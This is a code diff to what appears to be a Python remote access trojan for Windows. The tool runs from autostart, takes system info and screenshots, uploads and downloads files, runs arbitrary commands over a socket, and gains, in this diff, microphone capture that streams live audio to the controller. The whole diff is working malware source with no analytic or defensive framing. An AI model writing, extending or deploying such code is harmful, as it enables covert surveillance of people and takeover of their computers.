@@ -10,6 +10,7 @@ import ctypes
 import sys
 import platform
 import zlib
+import pyaudio
 
 
 # INIT VARIABLES
@@ -81,6 +82,7 @@ def PCINFO():
         'activewindowtitle': GetWindowTitle(),
     })
 
+
 def SCREENSHOT():
     return str({
         'screenshot': ScreenBITS(),
@@ -111,6 +113,7 @@ def Receive(sock, splitter='%:::%', end="[ENDOFMESSAGE]"):
     else:
         return 'info', ''
 
+
 def upload(sock, filename, end="[ENDOFMESSAGE]"):
     if not os.path.exists(filename):
         return 'fileExistsError'
@@ -128,6 +131,7 @@ def upload(sock, filename, end="[ENDOFMESSAGE]"):
             return 'uploadDone'
     return 'uploadError'
 
+
 def download(sock, filename, end="[ENDOFMESSAGE]"):
     recievedData = ''
     try:
@@ -144,6 +148,10 @@ def download(sock, filename, end="[ENDOFMESSAGE]"):
     except:
         return 'downloadError'
 
+def getDefaultInputDevice():
+    p = pyaudio.PyAudio()
+    device_name = p.get_default_input_device_info()
+    return device_name['name']
 
 def ScreenBITS():
     hDesktopDC = User32.GetWindowDC(hDesktopWnd)
@@ -217,10 +225,12 @@ def GetWindowTitle():
 
 
 class childSocket(threading.Thread):
-    def __init__(self):
+    def __init__(self, id, mode):
         super(childSocket, self).__init__()
 
         self.active = True
+        self.id = id
+        self.mode = mode
 
     def run(self):
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -230,21 +240,101 @@ class childSocket(threading.Thread):
             try:
                 mode, data = Receive(self.socket)
                 if data == 'pcinfo':
-                    Send(self.socket, PCINFO(), mode)
+                    stdoutput = PCINFO()
+                elif data.startswith('upload '):
+                    try:
+                        filename = data.split(' ')[1]
+                        stdoutput = download(self.socket, filename)
+                    except:
+                        stdoutput = 'uploadError'
+                elif data.startswith('download '):
+                    try:
+                        filename = data.split(' ')[1]
+                        stdoutput = upload(self.socket, filename)
+                    except:
+                        stdoutput = 'downloadError'
+                elif data.startswith('getDefaultInputDeviceName'):
+                    stdoutput = getDefaultInputDevice()
+                elif data.startswith('startAudio'):
+                    try:
+                        audioThread = audioStreaming(self.socket, int(data.split(' ')[-1]))
+                        audioThread.start()
+                        stdoutput = 'audioStarted'
+                    except:
+                        stdoutput = 'audioError'
+                elif data.startswith('stopAudio'):
+                    try:
+                        audioThread.active = False
+                    except:
+                        pass
+                    stdoutput = 'audioStopped'
+                elif data.startswith("cd"):
+                    try:
+                        os.chdir(data[3:])
+                        stdoutput = ""
+                    except:
+                        stdoutput = "Error opening directory"
+                elif data.startswith(("Activate")):
+                    stdoutput = ''
+                elif data.startswith("runscript "):
+                    stdoutput = Execute(data[10:])
+                elif data.startswith("ls"):
+                    string = {}
+                    try:
+                        for n, i in enumerate(os.listdir(u'.')):
+                            string[n] = {}
+                            string[n]['name'] = i
+                            string[n]['type'] = os.path.isfile(i)
+                            string[n]['size'] = os.path.getsize(i)
+                            string[n]['modified'] = time.ctime(os.path.getmtime(i))
+                            string[n]['hidden'] = has_hidden_attribute(i)
+                        string['path'] = os.getcwdu()
+                        stdoutput = str(string)
+                    except WindowsError:
+                        stdoutput = 'Access is denied'
+                elif data.startswith('myinfo'):
+                    stdoutput = self.mode + ' ' + self.id
                 else:
-                    Send(self.socket, 'child', mode)
+                    stdoutput = Exec(data)
+                Send(self.socket, stdoutput, mode)
             except socket.error:
                 return
 
 
-def startChildSocket(id):
-    try:
-        socketsBank[id] = childSocket()
-        socketsBank[id].setDaemon(True)
-        socketsBank[id].start()
-        return 'True'
-    except:
-        return 'False'
+class audioStreaming(threading.Thread):
+    def __init__(self, sock, rate):
+        super(audioStreaming, self).__init__()
+
+        self.active = True
+        self.sock = sock
+
+        self.chunk = 1024
+        self.format = pyaudio.paInt16
+        self.channel = 1
+        self.rate = rate
+
+        self.p = pyaudio.PyAudio()
+
+        self.stream = self.p.open(format=self.format, channels=self.channel, rate=self.rate, input=True,
+                                  frames_per_buffer=self.chunk)
+
+    def run(self):
+        while self.active:
+            try:
+                data = self.stream.read(self.chunk)
+                self.sock.sendall(data)
+            except socket.error:
+                self.active = False
+                break
+
+        self.stream.close()
+        self.p.terminate()
+
+
+def startChildSocket(id, mode):
+    socketsBank[id] = childSocket(id, mode)
+    socketsBank[id].start()
+    return id
 
 
 def fromAutostart():
@@ -269,8 +359,8 @@ def fromAutostart():
                 if data == 'getScreen':
                     Send(s, SCREENSHOT(), mode)
                     continue
-                if data == 'startChildSocket':
-                    Send(s, startChildSocket('tempid'), mode)
+                if data.startswith('startChildSocket'):
+                    Send(s, startChildSocket(str(data.split(' ')[-1]), mode), mode)
                     continue
                 if data == passKey:
                     active = True
@@ -282,44 +372,10 @@ def fromAutostart():
                             break
                         if data == 'info':
                             stdoutput = PCINFO()
+                        elif data.startswith('startChildSocket'):
+                            stdoutput = startChildSocket(str(data.split(' ')[-1]), mode)
                         elif data == 'getScreen':
                             stdoutput = SCREENSHOT()
-                        elif data.startswith('upload '):
-                            try:
-                                filename = data.split(' ')[1]
-                                stdoutput = download(s, filename)
-                            except:
-                                stdoutput = 'uploadError'
-                        elif data.startswith('download '):
-                            try:
-                                filename = data.split(' ')[1]
-                                stdoutput = upload(s, filename)
-                            except:
-                                stdoutput = 'downloadError'
-                        elif data.startswith("cd"):
-                            try:
-                                os.chdir(data[3:])
-                                stdoutput = ""
-                            except:
-                                stdoutput = "Error opening directory"
-                        elif data.startswith(("Activate")):
-                            stdoutput = ''
-                        elif data.startswith("runscript "):
-                            stdoutput = Execute(data[10:])
-                        elif data.startswith("ls"):
-                            string = {}
-                            try:
-                                for n, i in enumerate(os.listdir(u'.')):
-                                    string[n] = {}
-                                    string[n]['name'] = i
-                                    string[n]['type'] = os.path.isfile(i)
-                                    string[n]['size'] = os.path.getsize(i)
-                                    string[n]['modified'] = time.ctime(os.path.getmtime(i))
-                                    string[n]['hidden'] = has_hidden_attribute(i)
-                                string['path'] = os.getcwdu()
-                                stdoutput = str(string)
-                            except WindowsError:
-                                stdoutput = 'Access is denied'
                         else:
                             stdoutput = Exec(data)
                         Send(s, stdoutput, mode=mode)
